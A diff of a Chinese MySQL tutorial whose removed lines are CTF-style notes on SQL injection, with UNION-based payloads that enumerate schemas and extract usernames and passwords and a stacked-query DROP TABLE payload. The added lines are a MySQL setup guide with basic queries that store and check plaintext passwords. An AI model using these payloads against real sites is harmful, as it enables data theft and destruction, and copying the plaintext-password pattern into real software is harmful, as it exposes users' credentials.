@@ -1,133 +1,153 @@
-### 一、MySQL 系统表简介
+### 登录官网下载Mysql
 
-MySQL 的 **系统表** 存储在 `information_schema` 和 `mysql` 数据库中。它们保存了数据库的元数据，如表、列、用户权限、字符集等信息。
+https://dev.mysql.com/downloads
 
-> `information_schema`: 存储 MySQL 数据库服务器的元数据信息，用户可以查询这些表来了解数据库的结构。
->
-> `mysql`: 存储 MySQL 用户账户、权限等安全相关的信息。通常只有高权限用户才能访问。
+![image-20241108101623398](./assets/mysql/image-20241108101623398.png)
+
+![image-20241108101649632](./assets/mysql/image-20241108101649632.png)
+
+![image-20241108101714621](./assets/mysql/image-20241108101714621.png)
+
+### 运行安装文件
+
+![image-20241108102001962](./assets/mysql/image-20241108102001962.png)
+
+![image-20241108102147806](./assets/mysql/image-20241108102147806.png)
+
+![image-20241108102208745](./assets/mysql/image-20241108102208745.png)
+
+![image-20241108102238089](./assets/mysql/image-20241108102238089.png)
+
+![image-20241108102256656](./assets/mysql/image-20241108102256656.png)
+
+![image-20241108102320673](./assets/mysql/image-20241108102320673.png)
+
+**用户名和密码可以都叫root（因为本地使用，不会涉及到安全问题，生产环境密码要复杂，还需要给特定用户特定的权限）**
+
+![image-20241108102403633](./assets/mysql/image-20241108102403633.png)
+
+### 客户端下载 （HeidiSQL）
+
+[Download HeidiSQL](https://www.heidisql.com/download.php)
+
+![image-20241108102534023](./assets/mysql/image-20241108102534023.png)
+
+![image-20241108141424220](./assets/mysql/image-20241108141424220.png)
+
+![image-20241108141445667](./assets/mysql/image-20241108141445667.png)
+
+![image-20241108141506266](./assets/mysql/image-20241108141506266.png)
+
+![image-20241108141634404](./assets/mysql/image-20241108141634404.png)
+
+**此处User 和Password都填写之前设置的root，点击Open就可以打开本地Mysql数据库**
+
+```sql
+#创建数据库
+CREATE DATABASE aj_report;
+#使这个数据库
+USE aj_report;
+#在aj_report数据库中创建表lesson_user
+CREATE TABLE lesson_user (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    login_name VARCHAR(50) NOT NULL,
+    login_passwd VARCHAR(50) NOT NULL
+);
+#在表lesson_user中添加数据
+INSERT INTO lesson_user (login_name, login_passwd) 
+VALUES ('1', '1');
+
+
+```
+
+![image-20241108142010993](./assets/mysql/image-20241108142010993.png)
+
+-----------------------------------------------------------------表的操作---------------------------------------------------------------------------
+
+### 1. 插入数据（Insert）
+
+```sql
+INSERT INTO lesson_user (login_name, login_passwd) 
+VALUES ('user1', 'password123'), 
+       ('user2', 'securepass'),
+       ('user3', 'mypassword');
+```
+
+**作用**：向 `lesson_user` 表中插入三条数据。
+
+**解释**：`login_name` 是用户名，`login_passwd` 是密码。
 
 ------
 
-### 二、`information_schema` 数据库
+### 2. 查询数据（Select）
 
-`information_schema` 是 MySQL 的元数据表，主要包含以下常用的系统表：
+#### 2.1 查询所有用户
 
-| 系统表             | 描述                                           |
-| ------------------ | ---------------------------------------------- |
-| `TABLES`           | 存储所有数据库中表的信息，如表名、表类型等。   |
-| `COLUMNS`          | 存储所有数据库中列的信息，如列名、数据类型等。 |
-| `SCHEMATA`         | 存储所有数据库的名称。                         |
-| `KEY_COLUMN_USAGE` | 存储主键、外键等约束信息。                     |
-| `USER_PRIVILEGES`  | 存储用户权限信息。                             |
-| `CHARACTER_SETS`   | 存储 MySQL 支持的字符集信息。                  |
-| `COLLATIONS`       | 存储排序规则相关信息。                         |
+```sql
+SELECT * FROM lesson_user;
+```
+
+**作用**：查询表中的所有记录。
+
+#### 2.2 根据用户名查询
+
+```sql
+SELECT * FROM lesson_user WHERE login_name = 'user1';
+```
+
+**作用**：根据用户名 `user1` 查询该用户的信息。
 
 ------
 
-### 三、常见的 SQL 注入信息枚举过程
+### 3. 更新数据（Update）
 
-通过 **SQL 注入** 攻击，参赛者可以利用系统表来泄露数据库中的敏感信息。以下是常见的步骤：
-
-**获取数据库名称**
-
-```
-SELECT schema_name FROM information_schema.schemata;
+```sql
+UPDATE lesson_user 
+SET login_passwd = 'newpassword456' 
+WHERE login_name = 'user2';
 ```
 
-**获取表名称**
-
-```
-SELECT table_name FROM information_schema.tables WHERE table_schema='目标数据库';
-```
-
-**获取列名称**
-
-```
-SELECT column_name FROM information_schema.columns WHERE table_name='目标表' AND table_schema='目标数据库';
-```
-
-**获取表的数据** 一旦知道了表名和列名，可以通过 SQL 注入来获取表内的数据，例如：
-
-```
-SELECT login_name, login_passwd FROM lesson_user;
-```
+**作用**：将用户名为 `user2` 的密码更新为 `newpassword456`。
 
 ------
 
-### 四、基于 `information_schema` 的 SQL 注入示例
+### 4. 删除数据（Delete）
 
-假设一个网站存在 SQL 注入漏洞，我们将通过注入获取数据库信息。以下是一个注入场景示例。
-
-网站存在以下查询：
-
-```
-SELECT * FROM users WHERE username='$username' AND password='$password';
+```sql
+DELETE FROM lesson_user WHERE login_name = 'user3';
 ```
 
-攻击者可以通过修改输入来进行 SQL 注入。
-
-**获取数据库名称**
-
-```
-' OR 1=1 UNION SELECT schema_name, NULL FROM information_schema.schemata #
-```
-
-**获取表名**
-
-```
-' OR 1=1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='目标数据库' #
-```
-
-**获取列名**
-
-```
-' OR 1=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
-```
-
-**获取敏感数据**
-
-```
-' OR 1=1 UNION SELECT username, password FROM users #
-```
+**作用**：删除用户名为 `user3` 的记录。
 
 ------
 
-### 五、MySQL 用户账户表 (`mysql.user`)
+### 5. 清空表数据（Truncate）
 
-`mysql.user` 是存储 MySQL 用户信息的表，通常只有高权限用户可以访问。
-
-| 列名          | 描述                                                       |
-| ------------- | ---------------------------------------------------------- |
-| `Host`        | 用户允许登录的主机。                                       |
-| `User`        | 用户名。                                                   |
-| `Password`    | 用户密码（MySQL 8.0 之前存储为 `authentication_string`）。 |
-| `Select_priv` | 是否有 `SELECT` 权限。                                     |
-| `Insert_priv` | 是否有 `INSERT` 权限。                                     |
-| ...           | 其他权限字段，如 `UPDATE`, `DELETE` 等。                   |
-
-通过 SQL 注入，攻击者可以尝试获取用户表中的信息，从而进行进一步攻击。
-
+```sql
+TRUNCATE TABLE lesson_user;
 ```
-SELECT user, host FROM mysql.user;
-```
+
+**作用**：清空表 `lesson_user` 中的所有数据，但保留表结构。
 
 ------
 
-### 六、CTF 中的 SQL 注入技巧
+### 6. 删除表（Drop）
 
-**盲注**：当页面没有明显返回查询结果时，可以通过布尔盲注和时间盲注推测信息。
-
-**基于 `UNION` 的注入**：用于获取多个表的结果，特别是当页面返回数据时。
-
-堆叠查询（仅限某些数据库支持）：在一条语句中执行多个查询。
-
-```
-' OR 1=1; DROP TABLE lesson_user; #
+```sql
+DROP TABLE lesson_user;
 ```
 
-### 七、SQL 注入防护
+**作用**：删除整个 `lesson_user` 表，包括表结构和数据。
 
-1. **使用预处理语句 (Prepared Statements)**：防止 SQL 注入。
-2. **输入验证**：对用户输入进行过滤和验证，防止恶意字符注入。
-3. **最小权限原则**：限制数据库用户的权限，防止数据被恶意篡改。
-4. **隐藏系统信息**：避免将错误信息直接暴露给用户，防止信息泄露。
+------
+
+### 扩展：查询用户名和密码验证
+
+用于登录验证的查询语句：
+
+```sql
+SELECT * FROM lesson_user 
+WHERE login_name = 'user1' AND login_passwd = 'password123';
+```
+
+**作用**：验证 `user1` 的登录信息，如果用户名和密码匹配，则返回该用户记录。
